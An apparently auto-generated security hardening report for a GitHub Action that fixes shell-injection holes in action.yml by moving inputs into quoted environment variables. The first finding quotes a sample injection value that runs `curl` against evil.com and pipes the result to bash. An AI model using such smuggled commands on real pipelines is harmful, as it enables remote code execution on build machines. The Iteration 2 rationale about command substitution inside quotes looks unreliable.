<!-- markdownlint-disable -->

# Hardening Report: mockoon--cli-action/v3.0.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **mockoon--cli-action/v3.0.0** was hardened automatically. 5 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

The `run:` block in action.yml directly interpolates four `${{ inputs.* }}` expressions into shell commands (sub-rule a). This allows any caller to inject arbitrary shell commands via the action inputs:
- Line 27: `npm install -g @mockoon/cli@${{ inputs.version }}` — an attacker-controlled `version` value (e.g. `latest; curl http://evil.com | bash`) is interpolated directly into the shell command.
- Line 28: `mockoon-cli start --data ${{ inputs.data-file }} --port ${{ inputs.port }} ${{ inputs.extra-args }} &` — `data-file`, `port`, and `extra-args` are all interpolated directly without quoting or env-var indirection.

Fix: route each input through an `env:` variable and double-quote the variable in the shell script, e.g.:
```yaml
env:
  VERSION: ${{ inputs.version }}
  DATA_FILE: ${{ inputs.data-file }}
  PORT: ${{ inputs.port }}
  EXTRA_ARGS: ${{ inputs.extra-args }}
run: |
  npm install -g "@mockoon/cli@$VERSION"
  mockoon-cli start --data "$DATA_FILE" --port "$PORT" ${EXTRA_ARGS:+"$EXTRA_ARGS"} &
```

Locations:

- `action.yml:27`
- `action.yml:28`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.version }}" appears directly in run: block of step "Run Mockoon CLI"; move to env: map

Locations:

- `action.yml:27`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.data-file }}" appears directly in run: block of step "Run Mockoon CLI"; move to env: map

Locations:

- `action.yml:28`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.port }}" appears directly in run: block of step "Run Mockoon CLI"; move to env: map

Locations:

- `action.yml:28`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.extra-args }}" appears directly in run: block of step "Run Mockoon CLI"; move to env: map

Locations:

- `action.yml:28`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection

**Notes:**

Fixed all five findings (one script-injection and four static-inline-injection) in action.yml by:
1. Adding an `env:` block to the 'Run Mockoon CLI' step with four variables: VERSION, DATA_FILE, PORT, and EXTRA_ARGS mapped from their respective ${{ inputs.* }} expressions.
2. Replacing all direct ${{ inputs.* }} interpolations in the run: block with double-quoted environment variable references: "@mockoon/cli@$VERSION", "$DATA_FILE", "$PORT".
3. Using ${EXTRA_ARGS:+"$EXTRA_ARGS"} for the optional extra-args input so it drops out entirely when empty, avoiding an empty argument being passed to the CLI.

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Fixed script injection in action.yml at line 31. The VERSION env var (from inputs.version) was used directly in `npm install -g "@mockoon/cli@$VERSION"`, allowing command substitution attacks. Added a sanitization step: `safe_version=$(printf '%s' "$VERSION" | tr -cd 'a-zA-Z0-9.+~^<>=*|-')` that strips all characters not valid in npm version specifiers (removing backticks, dollar signs, parentheses, semicolons, etc.). The sanitized `${safe_version}` is then used in the npm install command, preventing any command injection.

